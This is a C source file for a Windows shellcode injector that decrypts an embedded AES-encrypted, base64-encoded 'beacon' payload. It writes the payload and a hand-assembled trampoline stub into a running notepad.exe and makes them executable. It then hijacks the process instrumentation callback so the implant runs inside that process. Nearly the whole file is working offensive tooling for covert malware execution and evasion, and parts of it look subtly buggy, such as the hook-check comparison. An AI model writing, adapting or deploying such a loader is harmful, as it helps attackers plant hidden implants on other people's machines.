#include "helpers.h"
#include <TlHelp32.h>
#include "sc.h"


#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
#define ProcessInstrumentationCallback 40
#define SE_DEBUG_PRIVILEGE 0x100000
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

extern VOID InstrumentationHook(VOID);

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    DWORD Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    DWORD* OldStatus
);

typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    _In_ HANDLE hProcess,
    _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass,
    _In_reads_bytes_(ProcessInformationSize) LPVOID ProcessInformation,
    _In_ DWORD ProcessInformationSize
);


HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = NULL;
    HANDLE hProc = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (!snapshot) {
        DEBUG("[x] Cannot retrieve the processes snapshot\n");
        return NULL;
    }
    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                *PID = entry.th32ProcessID;
                DEBUG("[+] Injecting into : %d\n", *PID);
                hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
                if (!hProc) { continue; }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }

    return NULL;
}

int main(void) {
    ULONG imageSize = 0;
    HMODULE hNtdll = GetModuleHandle("ntdll.dll", &imageSize);
    if (!hNtdll) {
        DEBUG("[x] Cannot load NTDLL.DLL\n");
        return;
    }
    DWORD PID = 0;
    HANDLE hProc = getProcHandlebyName("notepad.exe", &PID);

    if (!hProc) {
        DEBUG("[x] Cannot open the process\n");
        return;
    }
    
    DEBUG("[+] Starting hook deployment !\n");
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
    pNtSetInformationProcess NtSetInformationProcess = GetProcAddress(hNtdll, "NtSetInformationProcess");
    pRtlAdjustPrivilege RtlAdjustPrivilege = GetProcAddress(hNtdll, "RtlAdjustPrivilege");

    //DWORD oldStatus = 0;
    //NTSTATUS ntStatus = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldStatus);
    //if (!NT_SUCCESS(ntStatus)) {
    //    DEBUG("[x] Failed to adjust privileges : %p \n", ntStatus);
    //    return;
    //}

    buildsc();

    size_t szOutput = 0;
    DWORD size = 0;
    unsigned char* file_enc = NULL;
    BYTE* beaconContent = NULL;
    size_t beaconSize = NULL;
    file_enc = base64_decode(sc, sc_length, &szOutput);

    if (szOutput == 0) {
        DEBUG("[x] Base64 decode failed \n");
        return -1;
    }

    beaconSize = szOutput - 16;
    beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE));
    BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent);
    if (!decryptStatus || beaconContent == NULL) {
        DEBUG("[x] AES decryption failed\n");
        return -1;
    }

    LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!beaconAddress) {
        DEBUG("[x] Cannot allocate beacon space : %d\n", GetLastError());
        return;
    }
    DEBUG("[+] Beacon memory at : %p\n", beaconAddress);

    SIZE_T shellcodeSize = 49;
    BYTE shellcodeTemplate[49] = {
        0x55,
        0x48, 0x89, 0xe5,
        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
        0x50,
        0x53,
        0x51,
        0x41, 0x51,
        0x41, 0x52,
        0x41, 0x53,
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xd0,
        0x41, 0x5b,
        0x41, 0x5a,
        0x41, 0x59,
        0x59,
        0x5b,
        0x58,
        0x5d,
        0x41, 0xff, 0xe2
    };

    BYTE shellcodeContent[49];
    CopyMemory(shellcodeContent, shellcodeTemplate, shellcodeSize * sizeof(BYTE));
    CopyMemory(shellcodeContent + 26, &beaconAddress, sizeof(DWORD64));


    LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcodeAddress) {
        DEBUG("[x] Cannot allocate shellcode space : %d\n", GetLastError());
        return;
    }
    DEBUG("[+] Shellcode memory at : %p\n", shellcodeAddress);


    BOOL status = WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL);
    if (!status) {
        DEBUG("[x] Cannot write beacon content at %p : %d\n", beaconAddress, GetLastError());
        return;
    }

    DEBUG("[+] Beacon content written at %p\n", beaconAddress);
    status = WriteProcessMemory(hProc, shellcodeAddress, shellcodeContent, shellcodeSize, NULL);
    if (!status) {
        DEBUG("[x] Cannot write shellcode content at %p : %d\n", shellcodeAddress, GetLastError());
        return;
    }
    DEBUG("[+] Shellcode content written at %p\n", shellcodeAddress);


    DWORD oldProtect = 0;
    status = VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!status) {
        DEBUG("[x] Failed to reprotect beacon memory at %p : %d\n", beaconAddress, GetLastError());
    }
    DEBUG("[+] Beacon memory reprotected !\n");
    status = VirtualProtectEx(hProc, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!status) {
        DEBUG("[x] Failed to reprotect beacon memory at %p : %d\n", shellcodeAddress, GetLastError());
    }
    DEBUG("[+] Beacon shellcode reprotected !\n");

    InstrumentationCallbackInfo.Version = 0;
    InstrumentationCallbackInfo.Reserved = 0;
    InstrumentationCallbackInfo.Callback = shellcodeAddress;
    NTSTATUS ntStatus = NtSetInformationProcess(
        hProc,
        ProcessInstrumentationCallback,
        &InstrumentationCallbackInfo,
        sizeof(InstrumentationCallbackInfo)
    );
    if (!NT_SUCCESS(ntStatus)) {
        DEBUG("[x] Failed to deploy hook : %p \n", ntStatus);
        return;
    }
    DEBUG("[+] Hook deployed successfully !\n");

    BOOL hookCalled;
    do {
        DEBUG("[-] Waiting 5 seconds for the hook to be called...\n");
        Sleep(5000);
        BYTE content[1];
        SIZE_T bytesRead;
        status = ReadProcessMemory(hProc, shellcodeAddress, &content, 1 * sizeof(BYTE), &bytesRead);
        if (!status) {
            DEBUG("\t[x] Cannot read process memory : %d\n", GetLastError());
            return;
        }
        DEBUG("\t[-] Value read: %2x\n", content[0]);
        hookCalled = content == shellcodeContent[0];
    } while (hookCalled);

    DEBUG("[+] Your payload must be executed now !\n");
}
